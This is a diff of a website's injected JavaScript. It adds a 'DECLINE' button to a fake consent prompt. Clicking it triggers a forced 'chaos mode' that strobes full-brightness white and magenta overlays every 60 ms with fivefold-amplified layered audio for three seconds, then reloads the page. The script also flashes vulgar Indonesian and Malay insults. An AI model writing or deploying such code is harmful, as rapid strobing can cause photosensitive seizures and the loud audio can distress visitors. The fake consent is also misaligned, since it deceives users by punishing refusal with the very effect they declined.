@@ -6,33 +6,17 @@
     const SCROLL_THRESHOLD = 10; 
 
     const phrases = [
-        // English
         "STOP", "DON'T TOUCH", "NO!", "YAMETEEEEEE!", 
         "DAME!", "BAKA!", "ERROR", "FATAL", "FORBIDDEN",
         "ASU", "KYAAAAA!", "ANJING", "BUTO", "BABI", "PUKIMAK", "ANJING",
-        
-        // Japanese
-        "やめて!",      // Stop!
-        "触らないで!",  // Don't touch!
-        "ダメ!",       // No/Bad!
-        "うるさい!",    // Shut up/Noisy!
-        "警告",        // Warning
-        "エラー",      // Error
-        
-        // Chinese
-        "不要!",       // Don't!
-        "禁止",        // Forbidden
-        "错误",        // Error
-        "停下",        // Stop
-        "住手",        // Stop your hand
-        "别碰"         // Don't touch 
+        "やめて!", "触らないで!", "ダメ!", "うるさい!", "警告", "エラー",
+        "不要!", "禁止", "错误", "停下", "住手", "别碰"
     ];
 
     const audioSources = [
         'intro1.wav', 'intro2.wav', 'intro3.wav', 'intro4.wav'
     ];
 
-    // CONFIG: LOUDNESS SETTINGS
     const VOLUME_GAIN = 5.0; 
     const AUDIO_LAYERS = 6; 
 
@@ -76,6 +60,15 @@
         .consent-text h3 { margin: 0; color: #ff6ec7; font-size: 1.8rem; text-transform: uppercase; text-shadow: 2px 2px 0 #000; }
         .consent-text p { margin: 5px 0 0 0; font-size: 1.2rem; color: #ccc; }
         #loading-status { color: #ff92df; font-weight: bold; }
+
+        .btn-group { display: flex; gap: 10px; }
+        .mc-btn {
+            background: #000; color: #fff; border: 2px solid #fff;
+            padding: 10px 20px; font-family: inherit; font-size: 1.2rem;
+            cursor: pointer; text-transform: uppercase;
+        }
+        .mc-btn:hover:not(:disabled) { background: #fff; color: #000; }
+        .mc-btn:disabled { opacity: 0.5; cursor: wait; }
         
         /* Main Warning Flash (Magenta) */
         #warning-flash {
@@ -90,11 +83,10 @@
         /* PRE-FLASH (HDR P3 White) */
         #hdr-pre-flash {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background-color: white; /* Fallback */
-            background-color: color(display-p3 1 1 1); /* P3 Gamut White */
-            z-index: 2147483648; /* Sit on top of the warning */
+            background-color: white; 
+            background-color: color(display-p3 1 1 1); 
+            z-index: 2147483648; 
             pointer-events: none; opacity: 0;
-            /* Instant transition for strobe effect */
             transition: none;
             mix-blend-mode: normal;
         }
@@ -107,6 +99,7 @@
         }
         @media (max-width: 600px) {
             #consent-box { flex-direction: column; text-align: center; }
+            .btn-group { width: 100%; flex-direction: column; }
             #consent-box button { width: 100%; }
         }
         @keyframes shake {
@@ -116,12 +109,10 @@
     `;
     document.head.appendChild(style);
 
-    // 1. Create Pre-Flash Element
     const preFlashOverlay = document.createElement('div');
     preFlashOverlay.id = 'hdr-pre-flash';
     document.body.appendChild(preFlashOverlay);
 
-    // 2. Create Main Warning Element
     const flashOverlay = document.createElement('div');
     flashOverlay.id = 'warning-flash';
     const textSpan = document.createElement('span');
@@ -141,10 +132,13 @@
         <div id="consent-box">
             <div class="consent-text">
                 <h3>₊˚⊹ᰔ✨ Consent policy</h3>
-                <p>This site is using media playback feature to enhance reader experience, it is required to view the site.</p>
+                <p>This site is using media playback feature to enhance reader experience.</p>
                 <p id="loading-status">Loading Assets...</p>
             </div>
-            <button id="accept-btn" class="mc-btn" disabled>INITIALIZE</button>
+            <div class="btn-group">
+                <button id="decline-btn" class="mc-btn" disabled>DECLINE</button>
+                <button id="accept-btn" class="mc-btn" disabled>INITIALIZE</button>
+            </div>
         </div>
     `;
     document.body.appendChild(consentOverlay);
@@ -156,7 +150,8 @@
         const AudioContext = window.AudioContext || window.webkitAudioContext;
         audioContext = new AudioContext();
 
-        const loadBtn = document.getElementById('accept-btn');
+        const acceptBtn = document.getElementById('accept-btn');
+        const declineBtn = document.getElementById('decline-btn');
         const loadText = document.getElementById('loading-status');
 
         try {
@@ -169,11 +164,15 @@
             audioBuffers = await Promise.all(decodePromises);
             areAssetsLoaded = true;
 
-            loadText.innerText = "Assets Loaded. Click Initialize to enter.";
-            loadBtn.innerText = "I ACCEPT";
-            loadBtn.disabled = false;
+            loadText.innerText = "Assets Loaded. Choose an option.";
+            acceptBtn.innerText = "I ACCEPT";
             
-            loadBtn.addEventListener('click', () => {
+            // Enable both buttons
+            acceptBtn.disabled = false;
+            declineBtn.disabled = false;
+            
+            // --- ACCEPT LOGIC ---
+            acceptBtn.addEventListener('click', () => {
                 if (audioContext.state === 'suspended') audioContext.resume();
                 localStorage.setItem(STORAGE_KEY, 'true');
 
@@ -182,6 +181,31 @@
                     consentOverlay.style.display = 'none';
                     isAccepted = true;
                 }, 300);
+            });
+
+            // --- DECLINE LOGIC (CHAOS MODE) ---
+            declineBtn.addEventListener('click', async () => {
+                // 1. Reset Storage
+                localStorage.removeItem(STORAGE_KEY);
+                
+                // 2. Ensure audio is unlocked
+                if (audioContext.state === 'suspended') await audioContext.resume();
+
+                // 3. Disable buttons
+                acceptBtn.disabled = true;
+                declineBtn.disabled = true;
+                
+                // 4. Trigger Chaos Loop (Strobe)
+                const intervalId = setInterval(() => {
+                    // Pass 'true' to force trigger even if playing/not accepted
+                    triggerWarning(null, true); 
+                }, 60); // 60ms interval = extremely fast strobe
+
+                // 5. Reload after 3 seconds
+                setTimeout(() => {
+                    clearInterval(intervalId);
+                    location.reload();
+                }, 3000);
             });
 
         } catch (error) {
@@ -207,31 +231,33 @@
     }
 
     /* =========================================
-       5. TRIGGER LOGIC (MODIFIED)
+       5. TRIGGER LOGIC
     ========================================= */
-    async function triggerWarning(e) {
-        if (!isAccepted || !areAssetsLoaded || isPlaying) return; 
-
-        if (e && e.target && e.target.closest('#consent-overlay')) return;
-        if (e && e.target && e.target.closest('a')) return;
+    // Added 'force' param to bypass checks for the decline button chaos
+    async function triggerWarning(e, force = false) {
+        
+        // If it's a normal trigger (not forced), apply standard checks
+        if (!force) {
+            if (!isAccepted || !areAssetsLoaded || isPlaying) return; 
+            if (e && e.target && e.target.closest('#consent-overlay')) return;
+            if (e && e.target && e.target.closest('a')) return;
+        }
 
         if (audioContext && audioContext.state === 'suspended') {
             await audioContext.resume();
         }
         
-        isPlaying = true; 
+        // Only set locking flag if not in force mode (chaos mode ignores locks)
+        if (!force) isPlaying = true; 
 
         // --- STEP 1: PRE-FLASH (T = 0ms) ---
-        // Display full bright P3 white immediately
         preFlashOverlay.style.opacity = '1';
 
         // --- STEP 2: MAIN EXECUTION (T = 5ms) ---
         setTimeout(() => {
-            // 2a. Visuals: Show Magenta Overlay & Text
             textSpan.innerText = phrases[Math.floor(Math.random() * phrases.length)];
             flashOverlay.style.opacity = '1';
 
-            // 2b. Audio: Trigger Sound
             let newIndex;
             do {
                 newIndex = Math.floor(Math.random() * audioBuffers.length);
@@ -244,13 +270,11 @@
                 isPlaying = false;
             }
 
-            // 2c. Cleanup Main Visual (100ms later)
             setTimeout(() => { flashOverlay.style.opacity = '0'; }, 100);
 
         }, 5);
 
         // --- STEP 3: PRE-FLASH CLEANUP (T = 25ms) ---
-        // Turn off the white flash
         setTimeout(() => {
             preFlashOverlay.style.opacity = '0';
         }, 25);
